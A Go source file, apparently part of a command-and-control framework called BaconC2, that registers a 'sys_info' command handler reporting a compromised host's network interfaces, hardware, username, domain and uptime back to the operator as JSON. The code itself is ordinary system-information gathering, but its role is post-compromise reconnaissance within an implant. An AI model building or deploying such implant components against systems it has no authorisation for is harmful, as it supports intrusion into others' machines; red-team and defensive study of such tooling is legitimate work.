package system

import (
	"fmt"

	handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
)

func init() {
	handler.NewCommandHandlerRegistry().RegisterHandler(*NewGetInfoCommandHandler())
}

type MinimalSysInfo struct {
	Hostname string
	IP       string
	OS       string
	Protocol string
}

type ExtendedSysInfo struct {
	NetworkInterfaces []models.NetworkInterface
	Architecture      string
	CPUInfo           string
	MemoryTotal       uint64
	MemoryFree        uint64
	DiskTotal         uint64
	DiskFree          uint64
	Uptime            uint64
	ProcessCount      int
	Username          string
	Domain            string
	LastBootTime      string
}

func NewGetInfoCommandHandler() *handler.CommandHandler {
	return &handler.CommandHandler{
		Name:    "sys_info",
		Handler: GetInfoHandler,
	}
}

// GetInfoHandler processes the sys_info command
func GetInfoHandler(cmd models.Command) models.CommandResult {
	sysInfo, err := GatherExtendedInfo()
	if err != nil {
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("Failed to gather extended system info: %v", err)}),
		}
	}

	output := map[string]interface{}{
		"network_interfaces": sysInfo.NetworkInterfaces,
		"architecture":       sysInfo.Architecture,
		"cpu_info":           sysInfo.CPUInfo,
		"memory_total":       sysInfo.MemoryTotal,
		"memory_free":        sysInfo.MemoryFree,
		"disk_total":         sysInfo.DiskTotal,
		"disk_free":          sysInfo.DiskFree,
		"uptime":             sysInfo.Uptime,
		"process_count":      sysInfo.ProcessCount,
		"username":           sysInfo.Username,
		"domain":             sysInfo.Domain,
		"last_boot_time":     sysInfo.LastBootTime,
	}

	return models.CommandResult{
		ID:     cmd.ID,
		Status: models.CommandStatusCompleted,
		Output: formatter.ToJsonString(output),
	}
}
